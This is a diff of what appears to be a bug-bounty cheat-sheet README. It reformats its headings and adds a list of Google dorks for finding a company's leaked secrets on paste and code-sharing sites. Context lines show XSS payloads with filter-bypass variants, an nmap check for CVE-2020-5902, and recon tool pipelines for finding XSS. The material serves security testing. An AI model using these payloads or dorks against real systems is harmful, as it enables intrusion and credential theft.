@@ -188,8 +188,7 @@ nmap -p443 {IP} --script=http-vuln-cve2020-5902.nse
 
 ***
 
-# XSS Payloads
-
+## Basic XSS Payloads
 
 * If you control the name, will work on Firefox in any context, will fail in chromium in DOM 
 
@@ -266,6 +265,7 @@ nmap -p443 {IP} --script=http-vuln-cve2020-5902.nse
 ```html
 <style/onerror=eval(name)>
 ```
+***
 
 ## XSS Email User Input 
 * The email: test@test.com is being reflected
@@ -278,6 +278,8 @@ nmap -p443 {IP} --script=http-vuln-cve2020-5902.nse
 ```
 
 * [Medium post source](https://medium.com/bugbountywriteup/reflected-user-input-xss-c3e681710e74)
+
+***
 
 ## XSS payload with Alert Obfuscation, for bypass RegEx filters
 
@@ -293,6 +295,8 @@ nmap -p443 {IP} --script=http-vuln-cve2020-5902.nse
 ">'><details/open/ontoggle=confirm(1337)>
 ```
 
+***
+
 ## Method #1 to find XSS
 ```console
 amass enum -passive -norecursive -noalts -d domain .com -o domain.txt
@@ -307,18 +311,46 @@ Tools:
 - [nuclei](https://github.com/projectdiscovery/nuclei)
 - [nuclei-templates](https://github.com/projectdiscovery/nuclei-templates)
 
+***
+
 ## Method #2 to find XSS
 
 1) [Wayback](https://github.com/tomnomnom/waybackurls) to get all URLs
 2) Filtered only URLS with parameter and store it in a file
 3) [KXSS](https://github.com/tomnomnom/hacks/tree/master/kxss)
 
+***
 
+## Finding secrets using simple Google Dork
 
-## Find Jira misconfigurations (passwords and secrets) using simple Google Dork
+```
+site:http://codepad.co "company"
+site:http://scribd.com "company"
+site:http://npmjs.com "company"
+site:http://npm.runkit.com "company"
+site:http://libraries.io "company"
+site:http://ycombinator.com "company"
+site:http://coggle.it "company"
+site:http://papaly.com "company"
+site:http://google.com "company"
+site:http://trello.com "company"
+site:http://prezi.com "company"
+site:http://jsdelivr.net "company"
+site:http://codepen.io "company"
+site:http://codeshare.io "company"
+site:http://sharecode.io "company"
+site:http://pastebin.com "company"
+site:http://repl.it "company"
+site:http://productforums.google.com "company"
+site:http://gitter.im "company"
+site:http://bitbucket.org "company"
+site:*.atlassian.net "company"
+atlassian.net "company"
+inurl:gitlab "company"
+```
+- [Google dorks list](https://github.com/obheda12/GitDorker/tree/master/Dorks)
 
-- ```site:http://atlassian.net "company"```
-    - [Google dorks list](https://github.com/obheda12/GitDorker/tree/master/Dorks)
+***
 
 ## Open Redirect params
 
